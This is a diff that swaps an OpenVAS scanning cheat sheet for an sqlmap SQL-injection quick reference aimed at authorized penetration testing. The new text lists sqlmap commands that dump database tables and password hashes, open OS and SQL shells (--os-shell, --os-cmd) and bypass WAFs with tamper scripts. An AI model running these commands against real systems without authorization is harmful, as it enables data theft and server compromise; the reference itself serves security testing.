@@ -1,67 +1,83 @@
-# OpenVAS (Greenbone) Cheat Sheet
-**Vulnerability Scanning & Management — Quick Reference**
+# sqlmap Cheat Sheet
+**Automated SQL Injection Testing — Quick Reference**
 
 
 
 ## Core Workflow
 
-1. Configure a **Target** (host/IP range, optional credentials for authenticated scanning)
-2. Select a **Scan Config** (defines which NVTs run)
-3. Create and run a **Task** (target + config)
-4. Review the **Report**, sorted by CVSS severity
-5. Triage findings — confirm before escalating to remediation
+1. Confirm authorization
+2. Identify a suspected injectable parameter (manually or via Burp/ZAP)
+3. Confirm injection with sqlmap at default settings
+4. Enumerate databases → tables → data
+5. Escalate depth (`--risk`/`--level`) only if needed
+6. Document findings — technique used, data exposed, business impact
 
 
 
-## Setup / Service Commands
+## Basic Enumeration Commands
 
 | Command | Purpose |
 |---|---|
-| `gvm-setup` | Initial installation/configuration |
-| `gvm-check-setup` | Verify setup completed correctly |
-| `gvm-start` | Start all GVM/OpenVAS services |
-| `gvm-stop` | Stop all services |
-| `gvm-feed-update` | Manually refresh the NVT/CVE feed |
+| `sqlmap -u "http://target/page?id=1" --dbs` | List databases |
+| `sqlmap -u "..." -D dbname --tables` | List tables in a database |
+| `sqlmap -u "..." -D dbname -T tablename --columns` | List columns in a table |
+| `sqlmap -u "..." -D dbname -T tablename --dump` | Dump table data |
+| `sqlmap -u "..." --current-user` | Get current DB user |
+| `sqlmap -u "..." --current-db` | Get current database name |
+| `sqlmap -u "..." --passwords` | Dump DB user password hashes |
 
 
 
-## Scan Configs (built-in, common)
+## Working from Captured Requests
 
-| Config | Behavior |
+| Command | Purpose |
 |---|---|
-| **Full and fast** | Default — broad coverage, reasonably efficient |
-| **Full and fast ultimate** | Includes checks that may disrupt the target (DoS-risk NVTs) — use with caution |
-| **Discovery** | Host/service discovery only, no vulnerability checks |
-| **Host Discovery** | Lightweight — just confirms which hosts are alive |
-| **System Discovery** | OS and service fingerprinting, minimal vuln checks |
+| `sqlmap -r request.txt --batch` | Test using a request file (e.g., from Burp Suite) |
+| `sqlmap -r request.txt -p paramname` | Target a specific parameter within the request |
 
 
 
-## Severity / CVSS Reference
+## Risk & Level (test depth/intrusiveness)
 
-| CVSS Score | Severity |
-|---|---|
-| 9.0 – 10.0 | Critical |
-| 7.0 – 8.9 | High |
-| 4.0 – 6.9 | Medium |
-| 0.1 – 3.9 | Low |
-| 0.0 | None/Informational |
-
-
-
-## Authenticated vs. Unauthenticated
-
-| Scan Type | Visibility | Notes |
+| Setting | Range | Meaning |
 |---|---|---|
-| **Unauthenticated** | External/network-visible issues only | Faster, no credential risk, but significant blind spots |
-| **Authenticated** | Full local software/patch inventory | Requires storing credentials securely; much more accurate |
+| `--level` | 1–5 | How many injection points/tests attempted (higher = more thorough, slower) |
+| `--risk` | 1–3 | How intrusive tests are (higher = includes riskier payloads, e.g., time-based or heavier queries) |
+
+Default (`--level=1 --risk=1`) is appropriate for most first passes.
+
+
+
+## Injection Techniques (`--technique`)
+
+| Code | Technique |
+|---|---|
+| `B` | Boolean-based blind |
+| `E` | Error-based |
+| `U` | UNION query-based |
+| `S` | Stacked queries |
+| `T` | Time-based blind |
+| `Q` | Inline queries |
+
+Example: `--technique=BEU` restricts testing to boolean, error, and UNION-based only.
+
+
+
+## Escalation Flags (use only within explicit authorized scope)
+
+| Flag | Purpose |
+|---|---|
+| `--os-shell` | Attempt to get an interactive OS shell |
+| `--os-cmd` | Execute a single OS command |
+| `--sql-shell` | Interactive SQL shell on the compromised DB |
+| `--tamper=<script>` | Apply payload obfuscation to bypass basic WAF/filters |
 
 
 
 ## Pro Tips
 
-- **Authenticated scans reveal dramatically more** — an unauthenticated scan alone can create false confidence in a system's patch state.
-- Schedule full/"ultimate" configs only in maintenance windows — some NVTs can genuinely disrupt fragile services.
-- Keep the feed updated (`gvm-feed-update`) before any scan you intend to report on — stale feeds miss recent CVEs.
-- Export reports in multiple formats (PDF for stakeholders, XML/CSV for further processing or ticketing integration).
-- Treat every "High/Critical" finding as a starting point for manual verification, not an automatic ticket — false positives happen.
+- **Always confirm the injection manually first** — sqlmap automates exploitation, it doesn't replace understanding *why* the parameter is vulnerable.
+- `--batch` answers all prompts with defaults — useful for scripting, but review what it assumed afterward.
+- Start with `--dbs` before jumping to `--dump` — enumerate before extracting.
+- `-r request.txt` (a saved Burp request) is more reliable than manually rebuilding a `-u` URL with headers/cookies.
+- Treat `--os-shell` as a full-compromise action requiring explicit engagement authorization — not a routine flag.
